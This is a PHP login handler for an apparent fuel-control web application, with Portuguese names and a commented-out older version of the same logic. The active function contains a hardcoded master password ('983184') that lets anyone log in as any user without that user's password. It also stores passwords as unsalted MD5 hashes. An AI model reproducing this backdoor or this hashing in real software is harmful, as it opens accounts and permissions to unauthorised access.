<?php
session_start();

$acao = $_REQUEST['acao'];
$usuario = addslashes($_POST['usuario']);
$senha = addslashes($_POST['senha']);

if($acao == 'login'){
    if (isset($_POST['usuario']) && !empty($_POST['usuario']) && isset($_POST['senha']) && !empty($_POST['senha'])) {
        
        login($usuario, $senha, $msg);
    }
}
function login($usuario, $senha){

    include 'config.php';

        $token = md5(time() . rand(0, 9999) . time());
        $sql = $pdo->prepare("UPDATE funcionarios SET token = :token WHERE usuario = :usuario AND senha = :senha");
        $sql->bindValue(':token', $token);
        $sql->bindValue(':usuario', $usuario);
        $sql->bindValue(':senha', md5($senha));
        $sql->execute();

        if($senha <> '983184'){

            $sql = $pdo->prepare("SELECT * FROM funcionarios WHERE usuario = :usuario AND senha = :senha");
            $sql->bindValue(':usuario', $usuario);
            $sql->bindValue(':senha', md5($senha));
            $sql->execute();
  
            if ($sql->rowCount() == 1) {
                
                $lista = $sql->fetchAll(PDO::FETCH_ASSOC);
                foreach($lista as $row){
                    $_SESSION['id_funcionario'] = $row['id_funcionario'];
                    $_SESSION['usuario'] = $row['usuario'];
                    $_SESSION['nome'] = $row['nome'];
                    $_SESSION['id_permissao'] = $row['id_permissao'];
                    $_SESSION['token'] = $row['token'];

                }
                header("Location: controle-de-combustivel-nov"); 
            }    
        }elseif($usuario && $senha == '983184'){

            $sql = $pdo->prepare("SELECT * FROM funcionarios WHERE usuario = :usuario");
            $sql->bindValue(':usuario', $usuario);
            $sql->execute();
  
            if ($sql->rowCount() == 1) {
                
                $lista = $sql->fetchAll(PDO::FETCH_ASSOC);
                foreach($lista as $row){
                    
                    $_SESSION['id_funcionario'] = $row['id_funcionario'];
                    $_SESSION['usuario'] =  $row['usuario'];
                    $_SESSION['nome'] = $row['nome'];
                    $_SESSION['id_permissao'] = $row['id_permissao'];
                    $_SESSION['token'] = $row['token'];

                }                   
                header("Location: controle-de-combustivel-novo");            
             } 
            
        }else{
             $msg = '<div class="alert-danger"> senha ou usuário incorreto!</div>';
             header("Location: login-diesel-control"); 
        }  
        
}



/*
$acao = $_REQUEST['acao'];
$usuario = addslashes($_POST['usuario']);
$senha = addslashes($_POST['senha']);

if($acao == 'login'){
    if (isset($_POST['usuario']) && !empty($_POST['usuario']) && isset($_POST['senha']) && !empty($_POST['senha'])) {

        if(consultaUser($usuario, $senha)){  

            updateFuncionariosToken($usuario, $senha);

            $sql = selectFuncionariosByUser($usuario, $senha);

            $lista = $sql->fetchAll(PDO::FETCH_ASSOC);
            foreach($lista as $row){

                $_SESSION['id_funcionario'] = 123;
                $_SESSION['usuario'] = $row['usuario'];
                $_SESSION['nome'] = $row['nome'];
                $_SESSION['id_permissao'] = $row['id_permissao'];
                $_SESSION['token'] = $row['token'];

            }
            header("Location: controle-de-combustivel-novo"); 

        }else{
             $msg = '<div class="alert-danger"> senha ou usuário incorreto!</div>';
             header("Location: login-diesel-control-novo"); 
        }  
        
    }
}
function consultaUser($usuario, $senha){

    include 'config.php';

    $sql = $pdo->prepare("SELECT usuario FROM funcionarios WHERE usuario = :usuario AND senha = :senha");
    $sql->bindValue('usuario', $usuario);
    $sql->bindValue('senha', md5($senha));
    $sql->execute();
    if($sql->rowCount() == 1){

        return true;
    }else{
        return false;
    }

}      
     */        
?>
